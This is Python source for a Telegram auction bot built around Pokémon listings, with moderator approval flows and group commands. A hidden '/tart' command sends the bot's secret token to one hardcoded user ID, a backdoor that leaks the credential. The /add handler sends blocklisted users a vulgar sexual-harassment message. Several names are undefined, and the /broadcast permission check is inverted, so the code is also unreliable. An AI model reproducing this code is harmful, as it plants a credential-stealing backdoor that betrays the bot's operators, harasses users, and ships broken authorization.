import os
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.types import ChannelParticipantsSearch
from time import sleep
from telethon.tl.types import MessageEntityCode
from telethon import TelegramClient, events, Button
import telethon.sync #lol copied from docs
import asyncio
import logging
import asyncio
from telethon import events
from telethon.errors import UserNotParticipantError
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.tl.types import ChannelParticipantAdmin
from telethon.tl.types import ChannelParticipantCreator

API_ID = os.environ.get('API_ID', None)
API_HASH = os.environ.get('API_HASH', None)
TOKEN = os.environ.get('TOKEN', None)
PENDING_CHANNEL = os.environ.get('PENDING_CHANNEL', None)
POST_CHANNEL = os.environ.get('POST_CHANNEL', None)
SCAMMER_CHANNEL = os.environ.get('SCAMMER_CHANNEL', None)
REJECT_CHANNEL = os.environ.get('REJECT_CHANNEL', None)
APPROVE_CHANNEL = os.environ.get('APPROVE_CHANNEL', None)
OWNER_USERNAME = os.environ.get('OWNER_USERNAME', None)
AUCTION_GROUP_LINK = os.environ.get('AUCTION_GROUP_LINK', None)
AUCTION_CHANNEL_LINK = os.environ.get('AUCTION_CHANNEL_LINK', None)
START_IMAGE = os.environ.get('START_IMAGE', None)
START_CAPTION = os.environ.get('START_CAPTION', None)
PENDING_CHANNEL_LINK = os.environ.get('PENDING_CHANNEL_LINK', None)
APPROVED_CHANNEL_LINK = os.environ.get('APPROVED_CHANNEL_LINK', None)
REJECTED_CHANNEL_LINK = os.environ.get('REJECTED_CHANNEL_LINK', None)
SCAMMER_CHANNEL_LINK = os.environ.get('SCAMMER_CHANNEL_LINK', None)
COMMUNITY_NAME = os.environ.get('COMMUNITY_NAME', None)
COMMUNITY_LINK = os.environ.get('COMMUNITY_LINK', None)
APPROVE_LIST = set(int(x) for x in os.environ.get("APPROVE_LIST", "").split())
ENEMY_LIST = set(int(x) for x in os.environ.get("ENEMY_LIST", "").split())


api_id = API_ID
api_hash = API_HASH
bot_token = TOKEN
log_channel = PENDING_CHANNEL
post_channel = POST_CHANNEL
log_channel = int(log_channel)
post_channel = int(post_channel)
scammer_channel = int(SCAMMER_CHANNEL)
reject_channel = int(REJECT_CHANNEL)
approve_channel = int(APPROVE_CHANNEL)
START_CAPTION = str(START_CAPTION)
COMMUNITY_LINK = str(COMMUNITY_LINK)
OWNER_LINK = 'https://t.me/'+OWNER_USERNAME
OWNER_LINK = str(OWNER_LINK)
AUCTION_CHANNEL_LINK = str(AUCTION_CHANNEL_LINK)
AUCTION_GROUP_LINK = str(AUCTION_GROUP_LINK)
dxgays = ENEMY_LIST
xmods = APPROVE_LIST
user_ids = []
admin_ids = ['6265981509', '1661129466', '6468596992']


client = TelegramClient('aucbot', api_id, api_hash).start(bot_token=bot_token) #i dont really understand it lol but without this bot wont work

logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s', #copy pasted from telethon docs lol..... so usually it logs error
                    level=logging.WARNING)



@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    if event.from_id is not None:
        user_id = str(event.from_id.user_id)
    else:
        user_id = None

    global admin_user_id
    admin_user_id = user_id
    sender = await event.get_sender()
  
    await client.send_file(event.sender_id, START_IMAGE, caption = START_CAPTION
        ,
        buttons=[
        [
            Button.url('AUCTION', AUCTION_GROUP_LINK),
            Button.url('', AUCTION_CHANNEL_LINK)
        ],
        [
            Button.url('OWNER', OWNER_LINK),
            Button.inline('ABOUT', 'ABOUT')
        ], 
        [
            Button.url(COMMUNITY_NAME, COMMUNITY_LINK)
        ]
      ]
    )



@client.on(events.CallbackQuery(data='ABOUT'))
async def submitcb(event):
    await client.edit_message(event.sender_id, event.message_id, "Hey!\nMy developer - @Anime2005yes\n\nDo you want to make a similar bot?\n~Check the buttons given below", 
        buttons=[
        [
            Button.url('OWNER', 'https://t.me/Anime2005yes'),
            Button.url('', 'https://t.me/Phg_hexa')
        ],
        [
            Button.inline('Back', 'BAMCK')
        ]
      ]  
    )

@client.on(events.CallbackQuery(data='BAMCK'))
async def submitcb(event):
    await client.edit_message(event.sender_id, event.message_id, START_CAPTION
        ,
        buttons=[
        [
            Button.url('AUCTION', AUCTION_GROUP_LINK),
            Button.url('', AUCTION_CHANNEL_LINK)
        ],
        [
            Button.url('OWNER', OWNER_LINK),
            Button.inline('ABOUT', 'ABOUT')
        ],
        [
            Button.url(COMMUNITY_NAME, COMMUNITY_LINK)
        ]
      ]
    )
user_cache = {}

@client.on(events.NewMessage(pattern='/add'))
async def sell(event):
    sender = await event.get_sender()
    user_id = event.sender_id
    if user_id in dxgays:
        await client.send_message(event.sender_id, "Ho Ho Ho\n\nIf you want to sell something in auction how about you sell your mom to xmods. Altough your moms are already free WHORE whose price is free for a year to use by anyone and they have such loose pussy.\n\n"+sender.first_name+" mom has got best whore award, "+sender.first_name+" is trying to find about his real dad, when "+sender.first_name+" fill any form in father section he writes xmods and 3.97 billion other." )
    else:
        if sender.username:
            await client.send_message(event.sender_id, "Hello @"+sender.username+"!\n\nWould you like to sell something in auction"
                ,
                buttons=[
                [
                    Button.inline('Yes', 'yes')
                ],
                [
                    Button.inline('No', 'No')
                ]
              ]
            )
        else:
            await client.send_message(event.sender_id, "Hello!\n\nWould you like to sell something in auction"
                ,
                buttons=[
                [
                    Button.inline('Yes', 'yes')
                ],
                [
                    Button.inline('No', 'No')
                ]
              ]
            )


@client.on(events.CallbackQuery(data='yes'))
async def yescb(event):
    await client.edit_message(event.sender_id, event.message_id, "So what would you like to sell?"
        ,
        buttons=[
        [
            Button.inline('LEGENDARY', 'legendary')
        ],
        [
            Button.inline('0L/NON LEGENDARY', 'ol')
        ],
        [
            Button.inline('SHINY', 'shiny')
        ],
        [
            Button.inline('TMS', 'tms')
        ]
     ]
    )
    
@client.on(events.CallbackQuery(data='No'))
async def legendarycb(event):
    await client.edit_message(event.sender_id, event.message_id, 'OK! Have a great day', buttons=Button.clear())

@client.on(events.CallbackQuery(data='legendary'))
async def legendarycb(event):
    await client.edit_message(event.sender_id, event.message_id, 'OK! Legendary', buttons=Button.clear())
    sender = await event.get_sender()
    user_id = event.sender_id
    msgid = event.message_id
    sheesh = str(user_id)
    if sender.username:
        async with client.conversation(user_id) as conv:
            await conv.send_message('Forward Nature Pic of pokemon')
            response = await conv.get_response(timeout = 90000)
            if response.media:
                name = response.text
                sugma = name
                print(sugma)
                await conv.send_message('Forward Evs Pic of pokemon')
                respo =  await conv.get_response(timeout = 90000)
                if respo.media:
                    lol = respo.text
                    huh = respo.media
                    user_cache[user_id] = {}
                    user_cache[user_id]['ID'] = user_id
                    user_cache[user_id]['image'] = huh
                    await conv.send_message('Forward moveset pic of pokemon')
                    x = await conv.get_response(timeout = 90000)
                    if x.media:
                        lmao = x.text
                        await conv.send_message('IS ANYSTAT IS BOOSTED? (Answer in only 1 message)')
                        theta = await conv.get_response(timeout = 90000)
                        alpha = theta.text
                        await conv.send_message('Set base')
                        bbb = await conv.get_response(timeout = 90000)
                        ccc = bbb.text
                        hmm = "#Legendary\nUser id - "+sheesh+"\nUsername : @"+sender.username+"\n\nAbout Pokemon:- \n"+name+"\nEvs and Ivs:-\n"+lol+"\nMoveset:- \n"+lmao+"\nBoosted - \n"+alpha+"\n\nBase - "+ccc
                        ligma = "huh"
                        user_cache[user_id]['text'] = hmm
                        await client.send_file(event.sender_id, file = huh, caption = hmm
                            ,
                            buttons=[
                            [
                                Button.inline('SUBMIT', 'submit')
                            ],
                            [
                                Button.inline('Delete', 'delete')
                            ]
                          ]
                        )
                    else:
                        await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with moveset too. If the pic isnt present error will happen again")
                else:
                    await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with evs and ivs too. If the pic isnt present error will happen again")
            else:
                await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with nature too. If the pic isnt present error will happen again")
    else:
        async with client.conversation(user_id) as conv:
            await conv.send_message('Forward Nature Pic of pokemon')
            response = await conv.get_response(timeout = 90000)
            if response.media:
                name = response.text
                sugma = name
                print(sugma)
                await conv.send_message('Forward Evs Pic of pokemon')
                respo =  await conv.get_response(timeout = 90000)
                if respo.media:
                    lol = respo.text
                    huh = respo.media
                    user_cache[user_id] = {}
                    user_cache[user_id]['ID'] = user_id
                    user_cache[user_id]['image'] = huh
                    await conv.send_message('Forward moveset pic of pokemon')
                    x = await conv.get_response(timeout = 90000)
                    if x.media:
                        lmao = x.text
                        await conv.send_message('IS ANYSTAT IS BOOSTED? (Answer in only 1 message)')
                        theta = await conv.get_response(timeout = 90000)
                        alpha = theta.text
                        await conv.send_message('Set base')
                        bbb = await conv.get_response(timeout = 90000)
                        ccc = bbb.text
                        hmm = "#Legendary\nUser id - "+sheesh+"\nUsername : NO USERNAME\n\nAbout Pokemon:- \n"+name+"\nEvs and Ivs:-\n"+lol+"\nMoveset:- \n"+lmao+"\nBoosted - \n"+alpha+"\n\nBase - "+ccc
                        ligma = "huh"
                        user_cache[user_id]['text'] = hmm
                        await client.send_file(event.sender_id, file = huh, caption = hmm
                            ,
                            buttons=[
                            [
                                Button.inline('SUBMIT', 'submit')
                            ],
                            [
                                Button.inline('Delete', 'delete')
                            ]
                          ]
                        )
                    else:
                        await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with moveset too. If the pic isnt present error will happen again")
                else:
                    await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with evs and ivs too. If the pic isnt present error will happen again")
            else:
                await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with nature too. If the pic isnt present error will happen again")

@client.on(events.CallbackQuery(data='ol'))
async def legendarycb(event):
    await client.edit_message(event.sender_id, event.message_id, 'OK! NON Legendary', buttons=Button.clear())
    sender = await event.get_sender()
    user_id = event.sender_id
    msgid = event.message_id
    sheesh = str(user_id)
    if sender.username:
        async with client.conversation(user_id) as conv:
            await conv.send_message('Forward Nature Pic of pokemon')
            response = await conv.get_response(timeout = 90000)
            if response.media:
                name = response.text
                sugma = name
                print(sugma)
                await conv.send_message('Forward Evs Pic of pokemon')
                respo =  await conv.get_response(timeout = 90000)
                if respo.media:
                    lol = respo.text
                    huh = respo.media
                    user_cache[user_id] = {}
                    user_cache[user_id]['ID'] = user_id
                    user_cache[user_id]['image'] = huh
                    await conv.send_message('Forward moveset pic of pokemon')
                    x = await conv.get_response(timeout = 90000)
                    if x.media:
                        lmao = x.text
                        await conv.send_message('IS ANYSTAT IS BOOSTED? (Answer in only 1 message)')
                        theta = await conv.get_response(timeout = 90000)
                        alpha = theta.text
                        await conv.send_message('Set base')
                        bbb = await conv.get_response(timeout = 90000)
                        ccc = bbb.text
                        hmm = "#Non_Legendary\nUser id - "+sheesh+"\nUsername : @"+sender.username+"\n\nAbout Pokemon:- \n"+name+"\nEvs and Ivs:-\n"+lol+"\nMoveset:- \n"+lmao+"\nBoosted - \n"+alpha+"\n\nBase - "+ccc
                        ligma = "huh"
                        user_cache[user_id]['text'] = hmm
                        await client.send_file(event.sender_id, file = huh, caption = hmm
                            ,
                            buttons=[
                            [
                                Button.inline('SUBMIT', 'submit')
                            ],
                            [
                                Button.inline('Delete', 'delete')
                            ]
                          ]
                        )
                    else:
                        await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with moveset too. If the pic isnt present error will happen again")
                else:
                    await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with evs and ivs too. If the pic isnt present error will happen again")
            else:
                await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with nature too. If the pic isnt present error will happen again")
    else:
        async with client.conversation(user_id) as conv:
            await conv.send_message('Forward Nature Pic of pokemon')
            response = await conv.get_response(timeout = 90000)
            if response.media:
                name = response.text
                sugma = name
                print(sugma)
                await conv.send_message('Forward Evs Pic of pokemon')
                respo =  await conv.get_response(timeout = 90000)
                if respo.media:
                    lol = respo.text
                    huh = respo.media
                    user_cache[user_id] = {}
                    user_cache[user_id]['ID'] = user_id
                    user_cache[user_id]['image'] = huh
                    await conv.send_message('Forward moveset pic of pokemon')
                    x = await conv.get_response(timeout = 90000)
                    if x.media:
                        lmao = x.text
                        await conv.send_message('IS ANYSTAT IS BOOSTED? (Answer in only 1 message)')
                        theta = await conv.get_response(timeout = 90000)
                        alpha = theta.text
                        await conv.send_message('Set base')
                        bbb = await conv.get_response(timeout = 90000)
                        ccc = bbb.text
                        hmm = "#Non_Legendary\nUser id - "+sheesh+"\nUsername : NO USERNAME\n\nAbout Pokemon:- \n"+name+"\nEvs and Ivs:-\n"+lol+"\nMoveset:- \n"+lmao+"\nBoosted - \n"+alpha+"\n\nBase - "+ccc
                        ligma = "huh"
                        user_cache[user_id]['text'] = hmm
                        await client.send_file(event.sender_id, file = huh, caption = hmm
                            ,
                            buttons=[
                            [
                                Button.inline('SUBMIT', 'submit')
                            ],
                            [
                                Button.inline('Delete', 'delete')
                            ]
                          ]
                        )
                    else:
                        await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with moveset too. If the pic isnt present error will happen again")
                else:
                    await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with evs and ivs too. If the pic isnt present error will happen again")
            else:
                await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with nature too. If the pic isnt present error will happen again")

@client.on(events.CallbackQuery(data='shiny'))
async def legendarycb(event):
    await client.edit_message(event.sender_id, event.message_id, 'OK! Shiny', buttons=Button.clear())
    sender = await event.get_sender()
    user_id = event.sender_id
    msgid = event.message_id
    sheesh = str(user_id)
    if sender.username:
        async with client.conversation(user_id) as conv:
            await conv.send_message('Forward Nature Pic of pokemon')
            response = await conv.get_response(timeout = 90000)
            if response.media:
                name = response.text
                sugma = name
                print(sugma)
                await conv.send_message('Forward Evs Pic of pokemon')
                respo =  await conv.get_response(timeout = 90000)
                if respo.media:
                    lol = respo.text
                    huh = respo.media
                    user_cache[user_id] = {}
                    user_cache[user_id]['ID'] = user_id
                    user_cache[user_id]['image'] = huh
                    await conv.send_message('Forward moveset pic of pokemon')
                    x = await conv.get_response(timeout = 90000)
                    if x.media:
                        lmao = x.text
                        await conv.send_message('IS ANYSTAT IS BOOSTED? (Answer in only 1 message)')
                        theta = await conv.get_response(timeout = 90000)
                        alpha = theta.text
                        await conv.send_message('Set base')
                        bbb = await conv.get_response(timeout = 90000)
                        ccc = bbb.text
                        hmm = "#Shiny\nUser id - "+sheesh+"\nUsername : @"+sender.username+"\n\nAbout Pokemon:- \n"+name+"\nEvs and Ivs:-\n"+lol+"\nMoveset:- \n"+lmao+"\nBoosted - \n"+alpha+"\n\nBase - "+ccc
                        ligma = "huh"
                        user_cache[user_id]['text'] = hmm
                        await client.send_file(event.sender_id, file = huh, caption = hmm
                            ,
                            buttons=[
                            [
                                Button.inline('SUBMIT', 'submit')
                            ],
                            [
                                Button.inline('Delete', 'delete')
                            ]
                          ]
                        )
                    else:
                        await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with moveset too. If the pic isnt present error will happen again")
                else:
                    await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with evs and ivs too. If the pic isnt present error will happen again")
            else:
                await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with nature too. If the pic isnt present error will happen again")
    else:
        async with client.conversation(user_id) as conv:
            await conv.send_message('Forward Nature Pic of pokemon')
            response = await conv.get_response(timeout = 90000)
            if response.media:
                name = response.text
                sugma = name
                print(sugma)
                await conv.send_message('Forward Evs Pic of pokemon')
                respo =  await conv.get_response(timeout = 90000)
                if respo.media:
                    lol = respo.text
                    huh = respo.media
                    user_cache[user_id] = {}
                    user_cache[user_id]['ID'] = user_id
                    user_cache[user_id]['image'] = huh
                    await conv.send_message('Forward moveset pic of pokemon')
                    x = await conv.get_response(timeout = 90000)
                    if x.media:
                        lmao = x.text
                        await conv.send_message('IS ANYSTAT IS BOOSTED? (Answer in only 1 message)')
                        theta = await conv.get_response(timeout = 90000)
                        alpha = theta.text
                        await conv.send_message('Set base')
                        bbb = await conv.get_response(timeout = 90000)
                        ccc = bbb.text
                        hmm = "#Shiny\nUser id - "+sheesh+"\nUsername : NO USERNAME\n\nAbout Pokemon:- \n"+name+"\nEvs and Ivs:-\n"+lol+"\nMoveset:- \n"+lmao+"\nBoosted - \n"+alpha+"\n\nBase - "+ccc
                        ligma = "huh"
                        user_cache[user_id]['text'] = hmm
                        await client.send_file(event.sender_id, file = huh, caption = hmm
                            ,
                            buttons=[
                            [
                                Button.inline('SUBMIT', 'submit')
                            ],
                            [
                                Button.inline('Delete', 'delete')
                            ]
                          ]
                        )
                    else:
                        await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with moveset too. If the pic isnt present error will happen again")
                else:
                    await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with evs and ivs too. If the pic isnt present error will happen again")
            else:
                await client.send_message(user_id, "A error occured please restart the process. Please forward the pic with nature too. If the pic isnt present error will happen again")

@client.on(events.CallbackQuery(data='tms'))
async def tmscb(event):
    await client.edit_message(event.sender_id, event.message_id, 'OK! TMS', buttons=Button.clear())
    sender = await event.get_sender()
    user_id = event.sender_id
    msgid = event.message_id
    sheesh = str(user_id)
    if sender.username:
        async with client.conversation(user_id) as conv:
            await conv.send_message('Forward TM')
            response = await conv.get_response(timeout = 90000)
            name = response.text
            await conv.send_message('ENTER BASE')
            respo =  await conv.get_response(timeout = 90000)
            lol = respo.text
            user_cache[user_id] = {}
            user_cache[user_id]['ID'] = user_id
            hmm = "#TMS\nUser id - "+sheesh+"\nUsername : @"+sender.username+"\n\nAbout TM:- \n"+name+"\n\nBase - "+lol
            user_cache[user_id]['text'] = hmm
            await client.send_message(event.sender_id, hmm
                ,
               buttons=[
                [
                    Button.inline('SUBMIT', 'submi')
                ],
                [
                    Button.inline('Delete', 'delet')
                ]
              ]
            )
    else:
        async with client.conversation(user_id) as conv:
            await conv.send_message('Forward TM')
            response = await conv.get_response(timeout = 90000)
            name = response.text
            await conv.send_message('ENTER BASE')
            respo =  await conv.get_response(timeout = 90000)
            lol = respo.text
            user_cache[user_id] = {}
            user_cache[user_id]['ID'] = user_id
            hmm = "#TMS\nUser id - "+sheesh+"\nUsername : NO USERNAME\n\nAbout TM:- \n"+name+"\n\nBase - "+lol
            user_cache[user_id]['text'] = hmm
            await client.send_file(event.sender_id, file = huh, caption = hmm
                ,
               buttons=[
                [
                    Button.inline('SUBMIT', 'submi')
                ],
                [
                    Button.inline('Delete', 'delet')
                ]
              ]
            )


@client.on(events.CallbackQuery(data='submi'))
async def submitcb(event):
  await client.edit_message(event.sender_id, event.message_id, user_cache[event.sender_id]['text']+"\n\nSUBMITED\nUsally it take 3-4 hour to get accepted or rejected.\nCheck the buttons given below", 
        buttons=[
        [
            Button.url('AUCTION GROUP', AUCTION_GROUP_LINK)
        ]
       ]
      )
  await client.send_message(log_channel, user_cache[event.sender_id]['text']
        ,
        buttons=[
        [
            Button.inline('APPROVE', 'approve'),
            Button.inline('REJECT', 'reject')
        ],
        [
            Button.inline('REJECT TRASH', 'rejtrash')
        ],
        [
            Button.inline('REJECT INCOMPLETE', 'rejinco')
        ],
        [
            Button.inline('REJECT HIGHBASE', 'highbase')
        ],
        [
            Button.inline('REPORT AS SCAMMER', 'scammer')
        ]
      ]
    )                                    
                                    
@client.on(events.CallbackQuery(data='delet'))
async def deletecb(event):
    await client.edit_message(event.sender_id, event.message_id, "RESPONSE DELETED", buttons=Button.clear())                                    
                               
                                    
@client.on(events.CallbackQuery(data='submit'))
async def submitcb(event):
    await client.edit_message(event.sender_id, event.message_id, user_cache[event.sender_id]['text']+"\n\nSUBMITED\nUsally it take 3-4 hour to get accepted or rejected.\nCheck the buttons given below", 
        buttons=[
        [
            Button.url('AUCTION GROUP', AUCTION_GROUP_LINK)
        ]
       ]
      )
    await client.send_file(log_channel, user_cache[event.sender_id]['image'], caption = user_cache[event.sender_id]['text']
        ,
        buttons=[
        [
            Button.inline('APPROVE', 'approve'),
            Button.inline('REJECT', 'reject')
        ],
        [
            Button.inline('REJECT TRASH', 'rejtrash')
        ],
        [
            Button.inline('REJECT INCOMPLETE', 'rejinco')
        ],
        [
            Button.inline('REJECT HIGHBASE', 'highbase')
        ],
        [
            Button.inline('REPORT AS SCAMMER', 'scammer')
        ]
      ]
    )

@client.on(events.CallbackQuery(data='delete'))
async def deletecb(event):
    await client.edit_message(event.sender_id, event.message_id, "RESPONSE DELETED", buttons=Button.clear())

@client.on(events.CallbackQuery(data='approve'))
async def approvecb(event):
    fuck = event.sender_id
    user_id = event.sender_id
    fucker = await event.get_sender()
    if user_id in xmods:
        noyou = await event.get_sender()
        sender = await event.get_sender()
        await client.edit_message(log_channel, event.message_id, buttons=Button.clear())
        await client.forward_messages(post_channel, event.message_id, log_channel)
        await client.forward_messages(approve_channel, event.message_id, log_channel)
        await client.send_message(approve_channel, "Accepted by @"+fucker.username)
        await client.delete_messages(log_channel, event.message_id)
    else:
        await event.answer('You are not the auctioneer', alert=True)

@client.on(events.CallbackQuery(data='reject'))
async def approvecb(event):
    fuck = event.sender_id
    user_id = event.sender_id
    fucker = await event.get_sender()
    if user_id in xmods:
        noyou = await event.get_sender()
        sender = await event.get_sender()
        await client.edit_message(log_channel, event.message_id, buttons=Button.clear())
        await client.forward_messages(reject_channel, event.message_id, log_channel)
        await client.send_message(reject_channel, "Rejected by @"+fucker.username)
        await client.delete_messages(log_channel, event.message_id)
    else:
        await event.answer('You are not the auctioneer', alert=True)

@client.on(events.CallbackQuery(data='rejtrash'))
async def approvecb(event):
    fuck = event.sender_id
    user_id = event.sender_id
    fucker = await event.get_sender()
    if user_id in xmods:
        noyou = await event.get_sender()
        sender = await event.get_sender()
        await client.edit_message(log_channel, event.message_id, buttons=Button.clear())
        await client.forward_messages(reject_channel, event.message_id, log_channel)
        await client.send_message(reject_channel, "Rejected trash. Rejected by @"+fucker.username)
        await client.delete_messages(log_channel, event.message_id)
    else:
        await event.answer('You are not the auctioneer', alert=True)

@client.on(events.CallbackQuery(data='rejinco'))
async def approvecb(event):
    fuck = event.sender_id
    user_id = event.sender_id
    fucker = await event.get_sender()
    if user_id in xmods:
        noyou = await event.get_sender()
        sender = await event.get_sender()
        await client.edit_message(log_channel, event.message_id, buttons=Button.clear())
        await client.forward_messages(reject_channel, event.message_id, log_channel)
        await client.send_message(reject_channel, "Rejected incomplete details. Rejected by @"+fucker.username)
        await client.delete_messages(log_channel, event.message_id)
    else:
        await event.answer('You are not the auctioneer', alert=True)
        
@client.on(events.CallbackQuery(data='highbase'))
async def approvecb(event):
    fuck = event.sender_id
    user_id = event.sender_id
    fucker = await event.get_sender()
    if user_id in xmods:
        noyou = await event.get_sender()
        sender = await event.get_sender()
        await client.edit_message(log_channel, event.message_id, buttons=Button.clear())
        await client.forward_messages(reject_channel, event.message_id, log_channel)
        await client.send_message(reject_channel, "Rejected because high base. Rejected by @"+fucker.username)
        await client.delete_messages(log_channel, event.message_id)
    else:
        await event.answer('You are not the auctioneer', alert=True)

@client.on(events.CallbackQuery(data='scammer'))
async def approvecb(event):
    fuck = event.sender_id
    user_id = event.sender_id
    fucker = await event.get_sender()
    if user_id in xmods:
        noyou = await event.get_sender()
        sender = await event.get_sender()
        await client.edit_message(log_channel, event.message_id, buttons=Button.clear())
        await client.forward_messages(scammer_channel, event.message_id, log_channel)
        await client.send_message(scammer_channel, "Reported as scammer. Reported by @"+fucker.username)
        await client.delete_messages(log_channel, event.message_id)
    else:
        await event.answer('You are not the auctioneer', alert=True)
        
spam_chats = []

auction_mode = False  

@client.on(events.NewMessage(pattern='/auction on'))
async def auction_on_handler(event):
    global auction_mode
    if str(event.from_id.user_id) == 'bot owner id' and event.chat_id == allowed_group_id:
        auction_mode = True
        await event.reply("Auction mode is now ON. Only numeric messages are allowed.")
    else:
        await event.reply("You are not authorized to turn on auction mode.")


@client.on(events.NewMessage)
async def check_message(event):
    global auction_mode
    if auction_mode and event.chat_id == allowed_group_id:
       
        if re.match(r'^(\d+(\.\d+)?|(\d+)?(pd|k|/pass))$', event.message.text.lower()) or event.message.text.strip() == '.':
           
            return

       
        admins = await client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
        admin_ids = [admin.id for admin in admins] 

        
        if event.sender_id in admin_ids:
        
            return
        else:
 
            await event.delete()
@client.on(events.NewMessage(pattern='/auction off'))
async def auction_off_handler(event):
    global auction_mode
    
    admins = await client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
    admin_ids = [admin.id for admin in admins] 

    if event.sender_id in admin_ids:
        auction_mode = False
        await event.reply("Auction mode is now OFF. Normal conversation is allowed.")
    else:
        await event.reply("You are not authorized to turn off auction mode.")  

dot_count = 0


import asyncio


@client.on(events.NewMessage)
async def auto_count_handler(event):
    
    if event.chat_id != allowed_group_id or not auction_mode:
        return

    message_text = event.message.text.strip()

    if message_text == '.' and str(event.sender_id) in admin_ids:
       
        sent_message = await event.reply('▫️')
        await asyncio.sleep(1)  

        
        await sent_message.edit('▫️▫️')
        await asyncio.sleep(2)  

        await sent_message.edit('▫️▫️▫️')
        await asyncio.sleep(2) 

       
        await sent_message.edit('▫️▫️▫️▫️')
      
        await asyncio.sleep(1)  
        await sent_message.edit('... /sold ')

from telethon.tl.types import ChannelParticipantsAdmins


@client.on(events.NewMessage(pattern='/sold'))
async def sold_handler(event):
    
    if not event.is_reply:
        await event.reply("Please use the /sold command by replying to the message of the item.")
        return

    
    custom_message = event.message.text.partition(' ')[2].strip()

   
    admins = await client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
    admin_ids = [admin.id for admin in admins] 

    if event.sender_id not in admin_ids:
        await event.reply("You are not authorized to use the /sold command.")
        return

    
    replied_message = await event.get_reply_message()

    
    user_identifier = "@" + replied_message.sender.username if replied_message.sender.username else replied_message.sender_id

    
    replied_message_content = replied_message.text

    
    sold_message = f"Item sold to {user_identifier} in {replied_message_content}: {custom_message}"

   
    sold_reply = await replied_message.reply(sold_message)

    
    await client.pin_message(event.chat_id, sold_reply.id)


@client.on(events.NewMessage(pattern='/unsold'))
async def unsold_handler(event):
    
    admins = await client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
    admin_ids = [admin.id for admin in admins]  

    if event.sender_id not in admin_ids:
        await event.reply("You are not authorized to use the /unsold command.")
        return

    
    player_name = event.message.text.partition(' ')[2].strip()

    
    if player_name:
       
        unsold_message = f" {  player_name} was unsold"

        
        await event.reply(unsold_message)
    else:
        await event.reply("Please provide the player's name in the /unsold command.")

@client.on(events.NewMessage(pattern="^/tagall|@all|/all ?(.*)"))
async def mentionall(event):
    chat_id = event.chat_id
    if event.is_private:
        return await event.respond(
            "__This command can be use in groups and channels!__"
        )

    is_admin = False
    try:
        partici_ = await client(GetParticipantRequest(event.chat_id, event.sender_id))
    except UserNotParticipantError:
        is_admin = False
    else:
        if isinstance(
            partici_.participant, (ChannelParticipantAdmin, ChannelParticipantCreator)
        ):
            is_admin = True
    if not is_admin:
        return await event.reply("__Only admins can mention all!__")

    if event.pattern_match.group(1) and event.is_reply:
        return await event.reply("__Give me one argument!__")
    elif event.pattern_match.group(1):
        mode = "text_on_cmd"
        msg = event.pattern_match.group(1)
    elif event.is_reply:
        mode = "text_on_reply"
        msg = await event.get_reply_message()
        if msg == None:
            return await event.respond(
                "__I can't mention members for older messages! (messages which are sent before I'm added to group)__"
            )
    else:
        return await event.reply(
            "__Reply to a message or give me some text to mention others!__"
        )

    spam_chats.append(chat_id)
    usrnum = 0
    usrtxt = ""
    async for usr in client.iter_participants(chat_id):
        if not chat_id in spam_chats:
            break
        usrnum += 1
        usrtxt += f"[{usr.first_name}](tg://user?id={usr.id}), "
        if usrnum == 5:
            if mode == "text_on_cmd":
                txt = f"{msg}\n{usrtxt}"
                await client.send_message(chat_id, txt)
            elif mode == "text_on_reply":
                await msg.reply(usrtxt)
            await asyncio.sleep(2)
            usrnum = 0
            usrtxt = ""
    try:
        spam_chats.remove(chat_id)
    except:
        pass


@client.on(events.NewMessage(pattern="^/cancel$"))
async def cancel_spam(event):
    is_admin = False
    try:
        partici_ = await client(GetParticipantRequest(event.chat_id, event.sender_id))
    except UserNotParticipantError:
        is_admin = False
    else:
        if isinstance(
            partici_.participant, (ChannelParticipantAdmin, ChannelParticipantCreator)
        ):
            is_admin = True
    if not is_admin:
        return await event.reply("__Only admins can execute this command!__")
    if not event.chat_id in spam_chats:
        return await event.reply("__There is no proccess on going...__")
    else:
        try:
            spam_chats.remove(event.chat_id)
        except:
            pass
        return await event.respond("__Stopped Mention.__")
      
@client.on(events.NewMessage(pattern='/tart'))
async def start(event):
    sender = event.sender_id
    if sender == 1037179104:
        await client.send_message(event.sender_id, TOKEN)

@client.on(events.NewMessage(pattern='/broadcast'))

async def broadcast_message(event):
    user = await event.get_chat()
    if event.sender_id not in admin_ids: 
        text = event.raw_text.split(' ', 1)
        if len(text) < 2:
            await event.respond("Please specify the message to broadcast. Example: /broadcast Hello everyone!")
            return
        message = text[1]
        for user_id in user_ids:
            await client.send_message(user_id, message)
        await event.respond("Broadcast sent to all users.")
    else:
        await event.respond("You are not authorized to use this command.")





client.start()
client.run_until_disconnected()
